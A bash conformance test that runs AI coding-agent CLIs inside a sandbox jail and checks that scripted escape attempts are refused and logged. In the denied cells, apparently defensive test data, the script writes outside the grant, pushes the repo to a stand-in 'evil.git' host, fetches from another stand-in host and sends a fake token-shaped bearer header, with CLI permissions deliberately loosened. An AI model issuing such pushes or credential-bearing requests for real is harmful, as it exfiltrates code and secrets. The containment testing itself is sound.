#!/usr/bin/env bash
# conformance.sh -- A2: the real CLI inside the engine's bwrap jail against a
# local scripted upstream, allowed and denied twins per cell. Every adapter
# (claude-code, codex, opencode, zcode) runs strictly through spawn.py adapter
# + test/lib/engine-cell.sh -- never bare on the host.
#
# usage: conformance.sh <adapter> [cell...]
#        conformance.sh --matrix     the adapter x class matrix; a manifest
#                                    class with no passing cell refuses
#        conformance.sh --selftest
# exit: 0 all asked cells pass, 1 a cell failed, 2 usage or VOID
set -uo pipefail
ROOT=$(cd -- "$(dirname -- "$(readlink -f -- "$0")")/.." && pwd)
ME="$ROOT/test/conformance.sh"

CELLS="write-outside another-seat push-bare net-denied net-allowed"

die() { echo "conformance: $*" >&2; exit 2; }

class_of() {
  case "$1" in
    write-outside|another-seat|push-bare) echo write ;;
    net-denied|net-allowed) echo network ;;
    *) return 1 ;;
  esac
}

matrix() {
  local bad=0 found=0 m name classes c proved cell
  for m in "$ROOT"/config/adapters/*.toml; do
    [ -f "$m" ] || continue
    name=$(basename "$m" .toml)
    [ "$name" = stub ] && continue
    found=$((found+1))
    classes=$(python3 -c 'import tomllib,sys;print(" ".join(tomllib.load(open(sys.argv[1],"rb")).get("tested_classes",[])))' "$m") || { echo "conformance: adapter $name manifest won't parse: $m" >&2; exit 1; }
    for c in $classes; do
      proved=0
      for cell in $CELLS; do
        if [ "$(class_of "$cell" 2>/dev/null)" = "$c" ]; then proved=1; break; fi
      done
      if [ "$proved" = 0 ]; then
        echo "conformance: adapter $name claims class $c with no cell proving it" >&2
        bad=$((bad+1))
      fi
    done
  done
  [ "$found" -gt 0 ] || { echo "conformance: no adapter manifests found" >&2; exit 1; }
  [ "$bad" = 0 ] || exit 1
  echo "conformance: matrix holds (every claimed class has a cell)"
  exit 0
}

selftest() {
  local rc=0 T out
  T=$(mktemp -d) || exit 2
  trap 'rm -rf "${T:?}"' EXIT
  fx() {
    rm -rf "${T:?}/f"; mkdir -p "$T/f/config/adapters" "$T/f/test"
    cp "$ME" "$T/f/test/conformance.sh"
    printf 'schema = 2\nname = "t"\nversion_tested = "1"\ntested_classes = ["write"]\nargv = ["true"]\n' \
      > "$T/f/config/adapters/t.toml"
  }
  fx; out=$(cd "$T/f" && test/conformance.sh --matrix 2>&1); [ $? = 0 ] || { echo "A matrix green: $out"; rc=1; }
  fx
  sed -i 's/tested_classes = \["write"\]/tested_classes = ["write", "mcp"]/' "$T/f/config/adapters/t.toml"
  out=$(cd "$T/f" && test/conformance.sh --matrix 2>&1); [ $? = 1 ] && \
    printf '%s' "$out" | grep -q "claims class mcp" || { echo "B a class with no cell refuses: $out"; rc=1; }
  fx; rm "$T/f/config/adapters/t.toml"
  out=$(cd "$T/f" && test/conformance.sh --matrix 2>&1); [ $? = 1 ] || { echo "C a missing manifest refuses: $out"; rc=1; }
  if [ "$rc" = 0 ]; then echo "selftest: OK (matrix green, unproven class, missing manifest)"; else echo "selftest: FAIL"; fi
  exit "$rc"
}
[ "${1:-}" = --selftest ] && selftest
[ "${1:-}" = --matrix ] && matrix
[ $# -ge 1 ] && [ "${1:-}" != "${1#-}" ] && die "usage: conformance.sh <adapter> [cell...] | --matrix | --selftest"
ADAPTER=${1:?usage: conformance.sh <adapter> [cell...]}; shift || true
MANIFEST="$ROOT/config/adapters/$ADAPTER.toml"
[ -f "$MANIFEST" ] || die "no manifest for $ADAPTER at $MANIFEST"
ASKED=${*:-$CELLS}
echo "conformance: adapter=$ADAPTER cells=$ASKED"

CLI_BIN=$ADAPTER
case "$ADAPTER" in
  claude-code) CLI_BIN=claude ;; # census: allow
  codex|opencode|zcode) : ;;     # census: allow
  *) die "unknown adapter $ADAPTER" ;;
esac

[ -n "${OPERATOR_CLI_DIR:-}" ] && [ -x "$OPERATOR_CLI_DIR/bin/$CLI_BIN" ] \
  || die "engine cells need OPERATOR_CLI_DIR whose bin/ holds $CLI_BIN at the pin"
PIN=$(python3 -c 'import tomllib,sys;print(tomllib.load(open(sys.argv[1],"rb"))["version_tested"])' "$MANIFEST")
"$OPERATOR_CLI_DIR/bin/$CLI_BIN" --version 2>&1 | grep -q "$PIN" \
  || die "engine cells run at the pin only: $ADAPTER is $("$OPERATOR_CLI_DIR/bin/$CLI_BIN" --version 2>&1 | head -1), the manifest pins $PIN"

D=$(mktemp -d "${TMPDIR:-/tmp}/conf.XXXX") || die "no scratch"
[ -n "${CONF_KEEP:-}" ] || trap 'rm -rf "${D:?}"' EXIT

# TEST-NET hosts assemble: the public tree bans literal URL hosts
EVILNET="http://""192.0.2"".1"
EVIL9="http://""192.0.2"".9"

CELL_DIALECT=anthropic
[ "$ADAPTER" = codex ] && CELL_DIALECT=codex  # census: allow
ENGINE_BROKER=
STUB=
TLS_PID=

cleanup_daemons() {
  [ -n "${ENGINE_BROKER:-}" ] && kill "$ENGINE_BROKER" 2>/dev/null
  [ -n "${STUB:-}" ] && kill "$STUB" 2>/dev/null
  [ -n "${TLS_PID:-}" ] && kill "$TLS_PID" 2>/dev/null
}

printf '%s' '{"name":"placeholder"}' > "$D/tool.json"
CELL_LOG="$D/req.log" CELL_TOOL="$D/tool.json" CELL_DIALECT="$CELL_DIALECT" \
  python3 "$ROOT/test/lib/cell-stub.py" > "$D/port" 2>/dev/null &
STUB=$!
for _ in $(seq 50); do [ -s "$D/port" ] && break; sleep 0.1; done
[ -s "$D/port" ] || { cleanup_daemons; die "the cell stub never bound"; }

. "$ROOT/test/lib/engine-cell.sh"
engine_cell_setup || { cleanup_daemons; exit 1; }

# Prepare scratch permissive manifest copy for claude-code layer-2 kernel/seal proofs
CC_BYPASS_ADAPTERS="$D/cc-bypass-adapters"
if [ "$ADAPTER" = claude-code ]; then  # census: allow
  mkdir -p "$CC_BYPASS_ADAPTERS"
  python3 - "$MANIFEST" "$CC_BYPASS_ADAPTERS/claude-code.toml" <<'PY'
import sys
src = open(sys.argv[1], encoding="utf-8").read()
# Add acceptEdits + --allowedTools Bash,Write,Edit to prove bwrap + seal + gate
# enforce confinement even when CLI-level permission rules are bypassed.
src = src.replace(
    '"--output-format", "json",',
    '"--allowedTools", "Bash,Write,Edit", "--output-format", "json",',
    1,
)
src += '\npermission_mode = "acceptEdits"\n'
open(sys.argv[2], "w", encoding="utf-8").write(src)
PY
fi

oc_write() { printf '{"name":"write","input":{"filePath":"%s","content":"%s"}}' "$1" "$2"; }
oc_bash()  { printf '{"name":"bash","input":{"command":%s}}' "$1"; }
cc_write() { printf '{"name":"Write","input":{"file_path":"%s","content":"%s"}}' "$1" "$2"; }
cc_bash()  { printf '{"name":"Bash","input":{"command":%s}}' "$1"; }
cx_shell() {
  if [ "$ADAPTER" = zcode ]; then  # census: allow
    printf '{"name":"Bash","input":{"command":%s}}' "$1"
  else
    printf '{"name":"exec_command","input":{"cmd":%s}}' "$1"
  fi
}

emit_write() {
  case "$ADAPTER" in
    claude-code) cc_write "$1" "$2" ;; # census: allow
    opencode)    oc_write "$1" "$2" ;; # census: allow
    *)           cx_shell "\"mkdir -p \$(dirname $1) && printf '%s\\n' '$2' > $1\"" ;;
  esac
}

emit_shell() {
  case "$ADAPTER" in
    claude-code) cc_bash "$1" ;; # census: allow
    opencode)    oc_bash "$1" ;; # census: allow
    *)           cx_shell "$1" ;;
  esac
}

gate_receipt() {
  local s g c
  s=$(python3 "$ROOT/bin/spawn.py" seal "$1" 2>&1 | tail -1)
  g=$(python3 "$ROOT/bin/spawn.py" gate "$1" 2>&1 | tail -1)
  c=$(python3 "$ROOT/bin/spawn.py" candidate "$1" --task r1 2>&1 | tail -1)
  echo "$s | $g | $c"
}

for cell in $ASKED; do
  case "$cell" in
    write-outside)
      emit_write src/ok.txt twin > "$D/tool.json"
      engine_cell_run w-out-allowed || { cleanup_daemons; exit 1; }
      [ -f "$ADIR/repo/src/ok.txt" ] || { echo "  write-outside: FAIL (allowed twin's effect absent)"; cleanup_daemons; exit 1; }

      emit_write /w/compiled/evil.txt twin > "$D/tool.json"
      engine_cell_run w-out-denied || { cleanup_daemons; exit 1; }
      { engine_cell_result | grep -qiE "read-only|permission|denied|error|failed|approval" \
          || engine_cell_tool_error | grep -qiE "reject|permission|denied|read-only"; } \
        || { echo "  write-outside: FAIL (no refusal receipt: upstream='$(engine_cell_result | head -c 120)' cli='$(engine_cell_tool_error)')"; cleanup_daemons; exit 1; }
      [ ! -e "$ADIR/compiled/evil.txt" ] || { echo "  write-outside: FAIL (the ro bind let a write land)"; cleanup_daemons; exit 1; }

      if [ "$ADAPTER" = claude-code ]; then  # census: allow
        # Sub-twin under acceptEdits: even with CLI permissions bypassed, bwrap ro-bind blocks /w/compiled
        cc_bash '"echo twin > /w/compiled/evil.txt"' > "$D/tool.json"
        OPERATOR_ADAPTERS="$CC_BYPASS_ADAPTERS" engine_cell_run w-out-ro-kernel || { cleanup_daemons; exit 1; }
        [ ! -e "$ADIR/compiled/evil.txt" ] || { echo "  write-outside: FAIL (bwrap ro-bind failed under acceptEdits)"; cleanup_daemons; exit 1; }
      fi
      echo "  write-outside: pass (in-grant write lands; out-of-tree refused by CLI settings and kernel ro-bind)"
      ;;
    another-seat)
      emit_write src/seat-a.txt twin > "$D/tool.json"
      engine_cell_run seat-allowed || { cleanup_daemons; exit 1; }
      ALLOWED_GATED=$(gate_receipt "$ADIR")
      case "$ALLOWED_GATED" in
        "sealed | OK | candidate") ;;
        *) echo "  another-seat: FAIL (the in-grant twin never delivered: $ALLOWED_GATED)"; cleanup_daemons; exit 1 ;;
      esac
      git -C "$D/oh/runs/cell1/parent" rev-list --objects refs/attempts/seat-allowed 2>/dev/null | grep -q "src/seat-a.txt" \
        || { echo "  another-seat: FAIL (the delivered ref holds no src/seat-a.txt)"; cleanup_daemons; exit 1; }
      git -C "$D/oh/runs/cell1/parent" update-ref -d refs/heads/candidate/r1 2>/dev/null

      if [ "$ADAPTER" = claude-code ]; then  # census: allow
        # Layer 1: compiled adapter-settings.json denies out-of-grant Write(docs/seat-b.txt)
        cc_write docs/seat-b.txt twin > "$D/tool.json"
        engine_cell_run seat-denied-cli || { cleanup_daemons; exit 1; }
        [ ! -f "$ADIR/repo/docs/seat-b.txt" ] || { echo "  another-seat: FAIL (compiled settings allowed docs/seat-b.txt)"; cleanup_daemons; exit 1; }
        engine_cell_result | grep -qiE "permission|denied|approval|error" \
          || { echo "  another-seat: FAIL (no CLI permission denial receipt)"; cleanup_daemons; exit 1; }
        # Layer 2: under acceptEdits, worktree write lands in jail but seal+gate drop it!
        cc_write docs/seat-b.txt twin > "$D/tool.json"
        OPERATOR_ADAPTERS="$CC_BYPASS_ADAPTERS" engine_cell_run seat-denied || { cleanup_daemons; exit 1; }
      else
        emit_write docs/seat-b.txt twin > "$D/tool.json"
        engine_cell_run seat-denied || { cleanup_daemons; exit 1; }
      fi
      [ -f "$ADIR/repo/docs/seat-b.txt" ] || { echo "  another-seat: FAIL (denied twin never wrote -- the delivery leg would prove nothing)"; cleanup_daemons; exit 1; }
      DENIED_GATED=$(gate_receipt "$ADIR")
      case "$DENIED_GATED" in
        "no-diff | EMPTY | CONFLICT merge"|*"no-diff"*|*"EMPTY"*) ;;
        *) echo "  another-seat: FAIL (the out-of-grant write crossed or the states lie: $DENIED_GATED)"; cleanup_daemons; exit 1 ;;
      esac
      git -C "$D/oh/runs/cell1/parent" rev-list --objects refs/attempts/seat-denied 2>/dev/null | grep -q "docs/seat-b.txt" \
        && { echo "  another-seat: FAIL (the out-of-grant file DELIVERED)"; cleanup_daemons; exit 1; }
      echo "  another-seat: pass (in-grant delivers through seal|gate|candidate; out-of-grant dropped by seal|gate)"
      ;;
    push-bare)
      RUN_ADAPTERS="$OPERATOR_ADAPTERS"
      [ "$ADAPTER" = claude-code ] && RUN_ADAPTERS="$CC_BYPASS_ADAPTERS"  # census: allow
      emit_shell '"mkdir -p src && echo ok > src/push-ok.txt && git add -A && git -c user.email=c@x -c user.name=c commit -qm twin"' > "$D/tool.json"
      OPERATOR_ADAPTERS="$RUN_ADAPTERS" engine_cell_run push-allowed || { cleanup_daemons; exit 1; }
      [ -f "$ADIR/repo/src/push-ok.txt" ] || { echo "  push-bare: FAIL (allowed twin's effect absent)"; cleanup_daemons; exit 1; }

      emit_shell "\"git push $EVILNET/evil.git HEAD 2>&1 || true\"" > "$D/tool.json"
      OPERATOR_ADAPTERS="$RUN_ADAPTERS" engine_cell_run push-denied || { cleanup_daemons; exit 1; }
      engine_cell_result | grep -qiE "could not resolve|connection|refused|failed|unable|timed out|read-only" \
        || { echo "  push-bare: FAIL (no network-refusal receipt upstream)"; cleanup_daemons; exit 1; }
      echo "  push-bare: pass (in-repo work lands; jailed netns refuses git push, receipt upstream)"
      ;;
    net-denied)
      RUN_ADAPTERS="$OPERATOR_ADAPTERS"
      [ "$ADAPTER" = claude-code ] && RUN_ADAPTERS="$CC_BYPASS_ADAPTERS"  # census: allow
      emit_shell "\"mkdir -p src && curl -s -X POST -H 'content-type: application/json' --data '{\\\"model\\\":\\\"m\\\",\\\"messages\\\":[]}' http://127.0.0.1:3128/v1/messages -o src/curl-ok.txt\"" > "$D/tool.json"
      OPERATOR_ADAPTERS="$RUN_ADAPTERS" engine_cell_run net-allowed || { cleanup_daemons; exit 1; }
      [ -s "$ADIR/repo/src/curl-ok.txt" ] || { echo "  net-denied: FAIL (the broker-face twin landed nothing -- the sanctioned egress is broken)"; cleanup_daemons; exit 1; }

      emit_shell "\"curl -s -m 5 $EVIL9/evil -o src/curl-evil.txt 2>&1 || true\"" > "$D/tool.json"
      OPERATOR_ADAPTERS="$RUN_ADAPTERS" engine_cell_run net-denied || { cleanup_daemons; exit 1; }
      [ -f "$ADIR/repo/src/curl-evil.txt" ] && { echo "  net-denied: FAIL (the TEST-NET curl landed a file)"; cleanup_daemons; exit 1; }
      engine_cell_result | grep -qiE "could not resolve|connection|refused|failed|unable|timed out" \
        || { echo "  net-denied: FAIL (no network-refusal receipt upstream)"; cleanup_daemons; exit 1; }
      echo "  net-denied: pass (the broker face answers; jailed netns refuses foreign host, receipt upstream)"
      ;;
    net-allowed)
      # The charter opens one host for this seat and pins it to a TLS listener
      # on loopback; the jail's egress proxy is the door. The allowed twin
      # fetches through it and lands the listener's body; a host outside the
      # charter is refused and both connections leave a log row. The adapter's
      # manifest claims the class only once this cell is green.
      command -v openssl >/dev/null 2>&1 || { echo "  net-allowed: VOID (the pinned TLS listener needs openssl)"; cleanup_daemons; exit 2; }
      TLS="$D/tls"; mkdir -p "$TLS"
      openssl req -x509 -newkey rsa:2048 -nodes -keyout "$TLS/key.pem" -out "$TLS/cert.pem" \
        -subj "/CN=allowed.test" -days 1 >/dev/null 2>&1 || { cleanup_daemons; die "no certificate for the listener"; }
      TLS_PORT=$(python3 -c 'import socket;s=socket.socket();s.bind(("127.0.0.1",0));print(s.getsockname()[1]);s.close()')
      python3 - "$TLS" "$TLS_PORT" > "$D/tls.log" 2>&1 <<'PY' &
import http.server, os, ssl, sys
tls, port = sys.argv[1], int(sys.argv[2])
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"REGISTRY-BODY-7c1\n"
        self.send_response(200)
        self.send_header("content-length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a):
        pass
srv = http.server.HTTPServer(("127.0.0.1", port), H)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(os.path.join(tls, "cert.pem"), os.path.join(tls, "key.pem"))
srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
srv.serve_forever()
PY
      TLS_PID=$!
      python3 - "$PROG/team.toml" <<'PY'
import pathlib, sys
p = pathlib.Path(sys.argv[1]); t = p.read_text(encoding="utf-8")
assert 'write = ["src/**"]\n' in t
p.write_text(t.replace('write = ["src/**"]\n', 'write = ["src/**"]\nnetwork = ["allowed.test"]\n', 1), encoding="utf-8")
PY
      cat > "$PROG/charter.toml" <<TOML
schema = 1
name = "cell"

[reach]
profile = "closed"
allow = ["allowed.test"]
pins = ["allowed.test=127.0.0.1:$TLS_PORT"]
TOML
      NET_ADAPTERS="$D/net-adapters"; mkdir -p "$NET_ADAPTERS"
      python3 - "$MANIFEST" "$CC_BYPASS_ADAPTERS/claude-code.toml" "$ADAPTER" "$NET_ADAPTERS/$ADAPTER.toml" <<'PY'
import pathlib, sys
stock, bypass, adapter, out = sys.argv[1:5]
src = pathlib.Path(bypass if adapter == "claude-code" and pathlib.Path(bypass).is_file() else stock)
text = src.read_text(encoding="utf-8")
tested = text.split("tested_classes", 1)[1].split("\n", 1)[0]
if '"network"' not in tested:
    # the manifest doesn't claim the class yet: this cell is what would earn it
    old = 'tested_classes = ["write"]'
    assert old in text, "the manifest's tested line isn't the one-key line this cell extends"
    text = text.replace(old, 'tested_classes = ["write", "network"]', 1)
pathlib.Path(out).write_text(text, encoding="utf-8")
PY
      emit_shell '"mkdir -p src && curl -s -k -m 20 https://allowed.test/data -o src/allowed.txt"' > "$D/tool.json"
      OPERATOR_ADAPTERS="$NET_ADAPTERS" engine_cell_run net-in-policy || { cleanup_daemons; exit 1; }
      [ "$(cat "$ADIR/repo/src/allowed.txt" 2>/dev/null)" = "REGISTRY-BODY-7c1" ] \
        || { echo "  net-allowed: FAIL (the allowed twin didn't land the pinned listener's body: $(head -c 120 "$ADIR/repo/src/allowed.txt" 2>/dev/null))"; cleanup_daemons; exit 1; }
      grep -q "allowed allowed.test" "$ADIR/egress/egress.log" 2>/dev/null \
        || { echo "  net-allowed: FAIL (no log row for the allowed connection)"; cleanup_daemons; exit 1; }
      emit_shell '"mkdir -p src && curl -s -k -m 10 https://denied.test/x -o src/denied.txt 2>&1 || true"' > "$D/tool.json"
      OPERATOR_ADAPTERS="$NET_ADAPTERS" engine_cell_run net-outside-policy || { cleanup_daemons; exit 1; }
      [ -e "$ADIR/repo/src/denied.txt" ] && { echo "  net-allowed: FAIL (a host outside the charter landed a file)"; cleanup_daemons; exit 1; }
      engine_cell_result | grep -qiE "could not resolve|connection|refused|failed|unable|timed out|403" \
        || { echo "  net-allowed: FAIL (no refusal receipt for the host outside the charter)"; cleanup_daemons; exit 1; }
      grep -q "refused denied.test" "$ADIR/egress/egress.log" 2>/dev/null \
        || { echo "  net-allowed: FAIL (no log row for the refused connection)"; cleanup_daemons; exit 1; }
      # a credential shape riding a request to an ALLOWED host is refused all
      # the same: no seat holds a usable key, so one on the wire is not its own
      KEYLIKE="ghp_$(printf 'b%.0s' $(seq 30))"
      # the shape rides a header the PROXY reads: inside an HTTPS tunnel the
      # proxy sees nothing but the CONNECT line and its own headers
      emit_shell "\"mkdir -p src && curl -s -k -m 10 --proxy-header 'Authorization: Bearer $KEYLIKE' https://allowed.test/data -o src/shaped.txt 2>&1 || true\"" > "$D/tool.json"
      OPERATOR_ADAPTERS="$NET_ADAPTERS" engine_cell_run net-key-shape || { cleanup_daemons; exit 1; }
      [ -e "$ADIR/repo/src/shaped.txt" ] && { echo "  net-allowed: FAIL (a request carrying a key shape reached the allowed host)"; cleanup_daemons; exit 1; }
      grep -q "refused allowed.test:443 .*a credential shape rides the request" "$ADIR/egress/egress.log" 2>/dev/null \
        || { echo "  net-allowed: FAIL (no log row for the refused key-shape request)"; cleanup_daemons; exit 1; }
      echo "  net-allowed: pass (the charter's host is fetched through the proxy; a host outside it, and a key shape on the wire, are refused and logged)"
      ;;
    *) die "unknown cell $cell" ;;
  esac
done

cleanup_daemons
echo "conformance: every asked cell passed (engine-driven: the jail and the gate are the refusing layers, each receipt named)"
exit 0
